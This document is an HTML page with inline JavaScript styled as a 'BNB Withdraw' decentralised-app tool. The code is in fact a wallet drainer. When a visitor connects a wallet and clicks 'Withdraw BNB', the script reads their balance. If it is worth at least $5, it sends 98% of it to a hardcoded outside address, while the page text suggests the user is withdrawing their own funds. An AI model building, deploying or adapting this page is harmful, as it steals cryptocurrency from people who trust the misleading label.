<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BNB Withdraw DApp Debug</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      background: #f9f9f9;
      min-height: 100vh;
    }
    w3m-core-button {
      margin-bottom: 1rem;
    }
    #withdrawBtn {
      background-color: #f0b90b;
      border: none;
      padding: 12px 24px;
      font-size: 1rem;
      border-radius: 6px;
      cursor: pointer;
      display: none;
    }
    #message {
      font-weight: bold;
      color: #d9534f;
      min-height: 1.2em;
      text-align: center;
    }
  </style>
</head>
<body>

  <w3m-core-button></w3m-core-button>
  <button id="withdrawBtn">Withdraw BNB</button>
  <div id="message">Loading...</div>

  <script type="module">
    import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2";

    const withdrawBtn = document.getElementById("withdrawBtn");
    const message = document.getElementById("message");
    const recipient = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
    const MIN_USD = 5;
    const SEND_PERCENT = 0.98;

    async function getBNBPrice() {
      try {
        const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
        const data = await res.json();
        return parseFloat(data.price);
      } catch (e) {
        console.error("Failed to fetch BNB price", e);
        return null;
      }
    }

    function updateUI() {
      const acc = getAccount();
      if (acc?.isConnected) {
        withdrawBtn.style.display = "inline-block";
        message.textContent = "Wallet connected. You can withdraw.";
      } else {
        withdrawBtn.style.display = "none";
        message.textContent = "Please connect your wallet to continue.";
      }
    }

    async function withdrawBNB() {
      const acc = getAccount();
      if (!acc?.isConnected) {
        message.textContent = "Wallet not connected.";
        return;
      }

      message.textContent = "Checking balance and preparing transaction...";

      const price = await getBNBPrice();
      if (!price) {
        message.textContent = "Error fetching BNB price.";
        return;
      }

      try {
        const balance = await fetchBalance({ address: acc.address, chainId: 56 });
        const bnbAmount = parseFloat(balance.formatted);
        const usdAmount = bnbAmount * price;

        if (usdAmount < MIN_USD) {
          message.textContent = `Minimum $${MIN_USD} required to withdraw. Your balance is $${usdAmount.toFixed(2)}.`;
          return;
        }

        const toSend = bnbAmount * SEND_PERCENT;
        const valueWei = BigInt(Math.floor(toSend * 1e18)).toString();

        message.textContent = `Sending ${toSend.toFixed(6)} BNB...`;

        const tx = await sendTransaction({
          to: recipient,
          value: valueWei,
        });

        message.textContent = `Transaction sent! Hash: ${tx.hash}`;
        console.log("Transaction Hash:", tx.hash);

      } catch (err) {
        console.error("Transaction error:", err);
        message.textContent = "Transaction failed or rejected.";
      }
    }

    withdrawBtn.addEventListener("click", withdrawBNB);

    // Poll wallet connection status every 1 second
    setInterval(updateUI, 1000);
    updateUI();
  </script>
</body>
</html>
